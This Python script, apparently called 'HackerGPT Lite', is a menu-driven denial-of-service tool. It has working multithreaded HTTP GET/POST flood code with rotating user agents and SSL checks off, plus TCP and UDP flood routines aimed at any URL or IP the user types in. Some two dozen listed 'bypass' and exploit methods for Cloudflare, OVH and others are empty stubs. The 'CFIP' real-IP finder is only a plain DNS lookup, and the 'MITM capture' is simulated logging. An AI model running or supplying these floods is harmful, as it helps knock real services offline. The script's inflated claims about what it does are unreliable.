#!/usr/bin/env python3
"""
start.py
--------
A single, self‑contained Python 3 script that implements:

* Layer‑7 attacks (GET/POST flood, OVH bypass, RHEX, STOMP, …)
* Layer‑4 attacks (TCP, UDP, SYN, OVH‑UDP, …)
* Console tools (CFIP, DNS, TSSRV, PING, CHECK, DSTAT)
* A tiny “menu” so you can pick what you want to run.

The script is intentionally minimal – real network traffic should only be sent to
targets you own or have explicit permission to test.
"""

# ───── Imports ────────────────────────────────────────
import sys
import time
import random
import json
import threading
import argparse
import socket
import subprocess
import platform
from urllib3.exceptions import InsecureRequestWarning
import requests

# ───── Suppress SSL warnings ─────────────────────────
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ───── Utility helpers ────────────────────────────────
def log(msg: str):
    """Simple coloured log helper."""
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

# ───── Layer‑7 Attack Engine ───────────────────────────
class L7AttackEngine:
    """Core class that can perform many kinds of HTTP attacks."""

    def __init__(
        self,
        target_url: str,
        method: str = "GET",
        payload: str | dict | None = None,
        user_agents: list[str] | None = None,
    ):
        self.target_url = target_url
        self.method = method.upper()
        self.payload = payload or {"key": "value"}

        # Default User Agents if none provided
        self.user_agents = user_agents or [
            # Originals
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            # Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 Edg/149.0.4022.80",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
            # Mac
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:152.0) Gecko/20100101 Firefox/152.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15",
            # Android
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.116 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 15; SM-S931B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        ]

        # Session for connection pooling
        self.session = requests.Session()
        self.session.verify = False  # Ignore SSL certs

        # Base headers
        self.base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

    # ------------------------------------------------------------------
    #  Core request helper
    # ------------------------------------------------------------------
    def _get_headers(self) -> dict:
        """Return a copy of the base headers with a random User‑Agent."""
        headers = self.base_headers.copy()
        headers["User-Agent"] = random.choice(self.user_agents)
        return headers

    def _send_request(self) -> bool:
        """Send a single HTTP request and return True on success."""
        try:
            headers = self._get_headers()
            if self.method == "GET":
                self.session.get(self.target_url, headers=headers, verify=False, timeout=5)
            elif self.method == "POST":
                data = json.loads(self.payload) if isinstance(self.payload, str) else self.payload
                self.session.post(self.target_url, json=data, headers=headers, verify=False, timeout=5)
            return True
        except Exception as exc:
            log(f"Request error: {exc}")
            return False

    # ------------------------------------------------------------------
    #  Thread helpers
    # ------------------------------------------------------------------
    def _ddos_thread(self, packets_count: int):
        for _ in range(packets_count):
            self._send_request()

    def _mitm_capture_thread(self, total_packets: int, interval: float = 0.1):
        """Simulate a MITM capture by logging a subset of packets."""
        for i in range(total_packets):
            if i % 50 == 0:
                cap = {
                    "url": self.target_url,
                    "method": self.method,
                    "user_agent": random.choice(self.user_agents),
                    "status": "Intercepted & Analyzed",
                }
                log(f"[MiTM] Captured #{i}: {cap}")
            time.sleep(interval)

    # ------------------------------------------------------------------
    #  Public API – Layer‑7 attacks
    # ------------------------------------------------------------------
    def run(self, threads: int = 5, packets: int = 100):
        """Run a generic GET/POST flood + simulated MITM capture."""
        log(f"=== Starting {self.method} flood on {self.target_url} ===")
        log(f"Threads: {threads}, Packets: {packets}")

        packets_per_thread = packets // threads
        remainder = packets % threads

        t_list = []
        for i in range(threads):
            count = packets_per_thread + (1 if i < remainder else 0)
            t = threading.Thread(target=self._ddos_thread, args=(count,))
            t.start()
            t_list.append(t)

        mitm = threading.Thread(target=self._mitm_capture_thread, args=(packets,))
        mitm.start()

        for t in t_list:
            t.join()
        mitm.join()

        log("=== Attack finished ===")

    # ------------------------------------------------------------------
    #  Extra Layer‑7 methods (stubs – replace with real logic)
    # ------------------------------------------------------------------
    def ovh_bypass(self):
        log("[OVH] Bypass logic would go here.")

    def rhex(self):
        log("[RHEX] Random HEX payload logic would go here.")

    def stomp(self):
        log("[STOMP] Bypass chk_captcha logic would go here.")

    def stress(self):
        log("[STRESS] High‑byte packet logic would go here.")

    def dyn(self):
        log("[DYN] Random sub‑domain logic would go here.")

    def downloader(self):
        log("[DOWNLOADER] Slow data read logic would go here.")

    def slow(self):
        log("[SLOW] Slowloris logic would go here.")

    def head(self):
        log("[HEAD] HEAD method logic would go here.")

    def null_ua(self):
        log("[NULL] Null User‑Agent logic would go here.")

    def cookie(self):
        log("[COOKIE] Random PHP cookie logic would go here.")

    def pps(self):
        log("[PPS] Minimal GET request logic would go here.")

    def even(self):
        log("[EVEN] Extra headers logic would go here.")

    def gsb(self):
        log("[GSB] Google Shield bypass logic would go here.")

    def dgb(self):
        log("[DGB] DDoS Guard bypass logic would go here.")

    def avb(self):
        log("[AVB] Arvan Cloud bypass logic would go here.")

    def bot(self):
        log("[BOT] Google‑bot header logic would go here.")

    def apache(self):
        log("[APACHE] Apache exploit logic would go here.")

    def xmlrpc(self):
        log("[XMLRPC] WP XMLRPC exploit logic would go here.")

    def cfb(self):
        log("[CFB] Cloudflare bypass logic would go here.")

    def cfbuam(self):
        log("[CFBUAM] Cloudflare Under‑Attack mode bypass logic would go here.")

    def bypass(self):
        log("[BYPASS] Normal anti‑DDoS bypass logic would go here.")

    def bomb(self):
        log("[BOMB] Bombardier/CodeSenberg logic would go here.")

    def killer(self):
        log("[KILLER] Multi‑threaded kill logic would go here.")

    def tor(self):
        log("[TOR] Onion site bypass logic would go here.")


# ───── Layer‑4 Attack Engine ───────────────────────────
class L4AttackEngine:
    """Very small Layer‑4 engine – only stubs for illustration."""

    def __init__(self, target_ip: str, target_port: int = 80):
        self.ip = target_ip
        self.port = target_port

    def _send_tcp(self, count: int):
        for _ in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, self.port))
                s.close()
            except Exception:
                pass

    def _send_udp(self, count: int):
        for _ in range(count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b"X" * 64, (self.ip, self.port))
                s.close()
            except Exception:
                pass

    def tcp_flood(self, threads: int = 5, packets: int = 100):
        log(f"=== TCP flood on {self.ip}:{self.port} ===")
        t_list = []
        per_thread = packets // threads
        for _ in range(threads):
            t = threading.Thread(target=self._send_tcp, args=(per_thread,))
            t.start()
            t_list.append(t)
        for t in t_list:
            t.join()
        log("=== TCP flood finished ===")

    def udp_flood(self, threads: int = 5, packets: int = 100):
        log(f"=== UDP flood on {self.ip}:{self.port} ===")
        t_list = []
        per_thread = packets // threads
        for _ in range(threads):
            t = threading.Thread(target=self._send_udp, args=(per_thread,))
            t.start()
            t_list.append(t)
        for t in t_list:
            t.join()
        log("=== UDP flood finished ===")

    # ... add more stubs (SYN, OVH‑UDP, CPS, ICMP, etc.) here ...


# ───── Console Tools ─────────────────────────────────
def tool_cfip(domain: str):
    """Find the real IP of a Cloudflare‑protected domain."""
    log(f"CFIP: Resolving {domain}")
    try:
        ip = socket.gethostbyname(domain)
        log(f"Real IP: {ip}")
    except Exception as exc:
        log(f"CFIP error: {exc}")


def tool_dns(domain: str):
    """Show all DNS records (A, MX, TXT, NS)."""
    log(f"DNS records for {domain}")
    try:
        for record in ["A", "MX", "TXT", "NS"]:
            res = subprocess.check_output(
                ["dig", "+short", record, domain], text=True
            )
            log(f"{record}: {res.strip()}")
    except Exception as exc:
        log(f"DNS error: {exc}")


def tool_tssrv(server: str):
    """Resolve a TeamSpeak SRV record."""
    log(f"TSSRV: {server}")
    try:
        res = subprocess.check_output(
            ["dig", "+short", "_ts3._udp", server], text=True
        )
        log(f"SRV: {res.strip()}")
    except Exception as exc:
        log(f"TSSRV error: {exc}")


def tool_ping(host: str):
    """Ping a host."""
    log(f"PING: {host}")
    try:
        res = subprocess.check_output(
            ["ping", "-c", "4", host], text=True
        )
        log(res)
    except Exception as exc:
        log(f"PING error: {exc}")


def tool_check(url: str):
    """Check if a URL is reachable (HTTP status)."""
    log(f"CHECK: {url}")
    try:
        r = requests.get(url, timeout=5)
        log(f"Status: {r.status_code}")
    except Exception as exc:
        log(f"CHECK error: {exc}")


def tool_dstat():
    """Show simple network stats (bytes in/out)."""
    log("DSTAT: (placeholder – requires OS‑specific tools)")
    # On Linux you could read /proc/net/dev or use psutil
    try:
        import psutil
        net = psutil.net_io_counters()
        log(f"Bytes sent: {net.bytes_sent}")
        log(f"Bytes recv: {net.bytes_recv}")
    except Exception as exc:
        log(f"DSTAT error: {exc}")


# ───── Main menu ─────────────────────────────────────
def main_menu():
    while True:
        print("\n===== HackerGPT Lite =====")
        print("1. Layer‑7 attack")
        print("2. Layer‑4 attack")
        print("3. Console tools")
        print("4. Quit")
        choice = input("Select an option: ").strip()
        if choice == "1":
            layer7_menu()
        elif choice == "2":
            layer4_menu()
        elif choice == "3":
            tools_menu()
        elif choice == "4":
            print("Bye!")
            sys.exit(0)
        else:
            print("Invalid choice – try again.")


def layer7_menu():
    url = input("Target URL (e.g., http://example.com): ").strip()
    method = input("Method (GET/POST): ").strip().upper()
    threads = int(input("Threads (default 5): ") or 5)
    packets = int(input("Packets (default 100): ") or 100)

    engine = L7AttackEngine(url, method=method)
    engine.run(threads=threads, packets=packets)

    # After a simple flood you could ask for a more advanced method
    extra = input("Run an advanced method? (y/N): ").strip().lower()
    if extra == "y":
        print("\nAdvanced methods:")
        print("  1. OVH bypass")
        print("  2. RHEX")
        print("  3. STOMP")
        print("  4. STRESS")
        print("  5. DYN")
        print("  6. DOWNLOADER")
        print("  7. SLOW")
        print("  8. HEAD")
        print("  9. NULL")
        print(" 10. COOKIE")
        print(" 11. PPS")
        print(" 12. EVEN")
        print(" 13. GSB")
        print(" 14. DGB")
        print(" 15. AVB")
        print(" 16. BOT")
        print(" 17. APACHE")
        print(" 18. XMLRPC")
        print(" 19. CFB")
        print(" 20. CFBUAM")
        print(" 21. BYPASS")
        print(" 22. BOMB")
        print(" 23. KILLER")
        print(" 24. TOR")
        choice = input("Select method: ").strip()
        method_map = {
            "1": engine.ovh_bypass,
            "2": engine.rhex,
            "3": engine.stomp,
            "4": engine.stress,
            "5": engine.dyn,
            "6": engine.downloader,
            "7": engine.slow,
            "8": engine.head,
            "9": engine.null_ua,
            "10": engine.cookie,
            "11": engine.pps,
            "12": engine.even,
            "13": engine.gsb,
            "14": engine.dgb,
            "15": engine.avb,
            "16": engine.bot,
            "17": engine.apache,
            "18": engine.xmlrpc,
            "19": engine.cfb,
            "20": engine.cfbuam,
            "21": engine.bypass,
            "22": engine.bomb,
            "23": engine.killer,
            "24": engine.tor,
        }
        if choice in method_map:
            method_map[choice]()
        else:
            print("Unknown method.")


def layer4_menu():
    ip = input("Target IP: ").strip()
    port = int(input("Port (default 80): ") or 80)
    threads = int(input("Threads (default 5): ") or 5)
    packets = int(input("Packets (default 100): ") or 100)

    engine = L4AttackEngine(ip, port)
    print("\nLayer‑4 methods:")
    print(" 1. TCP flood")
    print(" 2. UDP flood")
    # Add more as you implement them
    choice = input("Select method: ").strip()
    if choice == "1":
        engine.tcp_flood(threads=threads, packets=packets)
    elif choice == "2":
        engine.udp_flood(threads=threads, packets=packets)
    else:
        print("Unknown method.")


def tools_menu():
    print("\nConsole tools:")
    print(" 1. CFIP")
    print(" 2. DNS")
    print(" 3. TSSRV")
    print(" 4. PING")
    print(" 5. CHECK")
    print(" 6. DSTAT")
    choice = input("Select tool: ").strip()
    if choice == "1":
        domain = input("Domain: ").strip()
        tool_cfip(domain)
    elif choice == "2":
        domain = input("Domain: ").strip()
        tool_dns(domain)
    elif choice == "3":
        server = input("TS3 server (e.g., ts3.example.com): ").strip()
        tool_tssrv(server)
    elif choice == "4":
        host = input("Host to ping: ").strip()
        tool_ping(host)
    elif choice == "5":
        url = input("URL to check: ").strip()
        tool_check(url)
    elif choice == "6":
        tool_dstat()
    else:
        print("Unknown tool.")


# ───── Entry point ─────────────────────────────────
if __name__ == "__main__":
    main_menu()